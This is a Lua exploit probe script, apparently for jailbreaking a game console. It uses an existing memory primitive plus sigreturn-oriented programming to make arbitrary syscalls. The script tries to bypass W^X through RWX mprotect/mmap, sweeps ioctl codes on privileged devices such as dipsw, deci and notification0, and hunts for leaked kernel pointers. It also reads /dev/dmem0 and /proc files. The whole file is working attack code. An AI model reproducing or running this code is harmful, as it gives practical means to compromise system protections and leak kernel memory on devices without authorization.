-- CRASH_CLASS: MODERATE
-- PROBE 132b: W^X bypass attempt via SROP + dipsw ioctl + deci devices
--
-- Critical test: mprotect(EXEC) was always blocked. But was it the
-- LOADER blocking it or the KERNEL? SROP bypasses the loader.
-- If kernel allows EXEC, we have code execution!
--
-- Also: dipsw ioctl on read-only fd, deci device ioctl

print("=== PROBE 132b: W^X BYPASS + DEVICE IOCTL ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local pid = to_num(sc20())
print("pid=" .. pid)

local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local rip = memory.read_qword(ctx + MC + 0xA0)
local rh, rl = get_hi_lo(rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4)
    pcall(function() return sc_gc(uint64(ctx)) end)
    memory.write_qword(ctx + MC + 0xA0, sc_addr)
    memory.write_qword(ctx + MC + 0x38, uint64(num))
    if a1 then memory.write_qword(ctx + MC + 0x08, a1) end
    if a2 then memory.write_qword(ctx + MC + 0x10, a2) end
    if a3 then memory.write_qword(ctx + MC + 0x18, a3) end
    if a4 then memory.write_qword(ctx + MC + 0x50, a4) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    return rv
end

local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x8000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))
local P = gpu
local B = gpu + 0x100
local function ws(buf, s)
    for i = 1, #s do memory.write_byte(buf+i-1, string.byte(s,i)) end
    memory.write_byte(buf+#s, 0)
end

--------------------------------------------------------------------
-- SECTION A: mprotect(EXEC) via SROP on existing GPU mmap
--------------------------------------------------------------------
print("")
print("--- [A] mprotect via SROP ---")

-- mprotect(10): addr, len, prot
-- PROT_READ=1, PROT_WRITE=2, PROT_EXEC=4
-- Try RWX (7) on our GPU mmap
local rv_rwx = srop(10, gpu, uint64(0x4000), uint64(7))
print("[A] mprotect(gpu, RWX=7)=" .. hex(rv_rwx))

-- Try RX (5)
local rv_rx = srop(10, gpu, uint64(0x4000), uint64(5))
print("[A] mprotect(gpu, RX=5)=" .. hex(rv_rx))

-- Try just EXEC (4)
local rv_x = srop(10, gpu, uint64(0x4000), uint64(4))
print("[A] mprotect(gpu, X=4)=" .. hex(rv_x))

-- mmap a NEW page via SROP with RWX
local rv_rwx_map = srop(477, uint64(0), uint64(0x4000), uint64(7),
    uint64(0x1002))
print("[A] mmap(RWX=7 via SROP)=" .. hex(rv_rwx_map))
local rwxh, rwxl = get_hi_lo(rv_rwx_map)
if rwxl ~= 0xFFFFFFFF and rwxh ~= 0xFFFFFFFF then
    -- Check if it's actually executable by reading protection
    -- Try writing code then mprotect to RX
    print("[A] got page at " .. hex(rv_rwx_map))
end

-- Try mmap with MAP_ANON|MAP_PRIVATE + PROT_READ|PROT_EXEC
local rv_rx_map = srop(477, uint64(0), uint64(0x4000), uint64(5),
    uint64(0x1002))
print("[A] mmap(RX=5 via SROP)=" .. hex(rv_rx_map))

-- Try sys 548 (batch VM ops) via SROP
local vm_buf = memory.alloc(0x100)
memory.write_dword(vm_buf, 0)
memory.write_qword(vm_buf + 8, gpu)
memory.write_qword(vm_buf + 0x10, uint64(0x4000))
memory.write_dword(vm_buf + 0x18, 7)
local rv_vm = srop(548, vm_buf, uint64(1), uint64(0))
print("[A] sys548(batch prot RWX)=" .. hex(rv_vm))

print("[A] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION B: dipsw ioctl on O_RDONLY fd
--------------------------------------------------------------------
print("")
print("--- [B] dipsw ioctl ---")
ws(P, "/dev/dipsw")
local fd_dip = to_num(srop(5, P, uint64(0)))
print("[B] dipsw fd=" .. fd_dip)

if fd_dip > 0 and fd_dip < 256 then
    -- PS4 dipsw ioctl: 0x40048806 = read, 0x40048807 = write
    -- _IOR('x', 6, int) = 0x40047806 maybe?
    -- Try multiple ioctl families
    local codes = {
        0x40048806, 0x40048807,
        0x40047806, 0x40047807,
        0x80048806, 0x80048807,
        0xC0048806, 0xC0048807,
        0x40088806, 0x40088807,
        0x20008800, 0x20008801,
        0x40048800, 0x40048801,
        0x40048802, 0x40048803,
        0x40048804, 0x40048805,
    }
    for _, code in ipairs(codes) do
        memory.write_dword(B, 0x42424242)
        memory.write_dword(B+4, 0)
        local rv_io = srop(54, uint64(fd_dip), uint64(code), B)
        local ioh, iol = get_hi_lo(rv_io)
        local val = to_num(memory.read_dword(B))
        if iol == 0 and ioh == 0 then
            print(string.format("[B] ioctl(0x%08X)=OK val=0x%X", code, val))
        end
    end
    srop(6, uint64(fd_dip))
end
print("[B] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION C: deci devices ioctl
--------------------------------------------------------------------
print("")
print("--- [C] deci devices ---")
local deci_devs = {"/dev/deci_stdin", "/dev/deci_stdout", "/dev/deci_tty2"}
for _, d in ipairs(deci_devs) do
    ws(P, d)
    local fd_d = to_num(srop(5, P, uint64(2)))
    if fd_d > 0 and fd_d < 256 then
        print("[C] " .. d .. " fd=" .. fd_d)
        -- Try read
        memory.write_qword(B, uint64(0xDEADBEEF))
        local rv_r = srop(3, uint64(fd_d), B, uint64(8))
        print("[C]   read=" .. hex(rv_r))
        -- Try fstat
        memory.write_qword(B, uint64(0))
        memory.write_qword(B+8, uint64(0))
        memory.write_qword(B+0x10, uint64(0))
        memory.write_qword(B+0x18, uint64(0))
        local rv_fs = srop(189, uint64(fd_d), B)
        print("[C]   fstat=" .. hex(rv_fs))
        if to_num(rv_fs) == 0 then
            local dev = memory.read_qword(B)
            local ino = memory.read_qword(B+8)
            print("[C]   dev=" .. hex(dev) .. " ino=" .. hex(ino))
        end
        srop(6, uint64(fd_d))
    else
        print("[C] " .. d .. " FAIL")
    end
end
print("[C] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION D: notification0 ioctl sweep via SROP
--------------------------------------------------------------------
print("")
print("--- [D] notification0 ioctl ---")
ws(P, "/dev/notification0")
local fd_not = to_num(srop(5, P, uint64(2)))
print("[D] notification0 fd=" .. fd_not)

if fd_not > 0 and fd_not < 256 then
    local ioctl_hits = 0
    for base = 0, 0x30 do
        memory.write_qword(B, uint64(0))
        memory.write_qword(B+8, uint64(0))
        memory.write_qword(B+0x10, uint64(0))
        memory.write_qword(B+0x18, uint64(0))
        local code = 0xC0104E00 + base
        local rv_io = srop(54, uint64(fd_not), uint64(code), B)
        local ioh, iol = get_hi_lo(rv_io)
        if iol == 0 and ioh == 0 then
            ioctl_hits = ioctl_hits + 1
            local v0 = memory.read_qword(B)
            local v1 = memory.read_qword(B+8)
            local v0h, v0l = get_hi_lo(v0)
            if v0l ~= 0 or v0h ~= 0 or to_num(memory.read_qword(B+8)) ~= 0 then
                print(string.format("[D] ioctl(0x%08X)=OK %s %s", code, hex(v0), hex(v1)))
                if v0h >= 0xFFFF8000 and v0h ~= 0xFFFFFFFF then
                    print("[D] *** KERNEL POINTER! ***")
                end
            end
        end
    end
    print("[D] " .. ioctl_hits .. " ioctls returned OK")
    srop(6, uint64(fd_not))
end
print("[D] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION E: Try pread(173) on dmem0 with correct syscall
--------------------------------------------------------------------
print("")
print("--- [E] pread(173) dmem0 ---")
ws(P, "/dev/dmem0")
local fd_dm = to_num(srop(5, P, uint64(0)))
print("[E] dmem0 fd=" .. fd_dm)

if fd_dm > 0 and fd_dm < 256 then
    -- pread(173): fd, buf, nbytes, offset (R10)
    memory.write_qword(B, uint64(0xCAFEBABE))
    local rv_pr = srop(173, uint64(fd_dm), B, uint64(8), uint64(0))
    print("[E] pread(173,off=0)=" .. hex(rv_pr))

    memory.write_qword(B, uint64(0xCAFEBABE))
    rv_pr = srop(173, uint64(fd_dm), B, uint64(8), uint64(0x1000))
    print("[E] pread(173,off=0x1000)=" .. hex(rv_pr))

    -- Try mmap of dmem0 via SROP (5 args needed)
    -- Can't do 5+ args with current srop, skip
    srop(6, uint64(fd_dm))
end
print("[E] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION F: Try reading /proc if it exists
--------------------------------------------------------------------
print("")
print("--- [F] /proc paths ---")
local proc_paths = {
    "/proc/curproc/map",
    "/proc/curproc/mem",
    "/proc/curproc/status",
    "/proc/curproc/file",
    "/proc/curproc/cmdline",
}
for _, p in ipairs(proc_paths) do
    ws(P, p)
    local rv = srop(5, P, uint64(0))
    local rvh, rvl = get_hi_lo(rv)
    if rvl < 256 and rvh == 0 then
        print("[F] " .. p .. " fd=" .. rvl)
        memory.write_qword(B, uint64(0))
        memory.write_qword(B+8, uint64(0))
        local rv_r = srop(3, uint64(rvl), B, uint64(16))
        print("[F]   read=" .. hex(rv_r) .. " data=" .. hex(memory.read_qword(B)))
        srop(6, uint64(rvl))
    else
        print("[F] " .. p .. " FAIL")
    end
end

print("")
print("pid=" .. to_num(sc20()))
print("=== DONE ===")
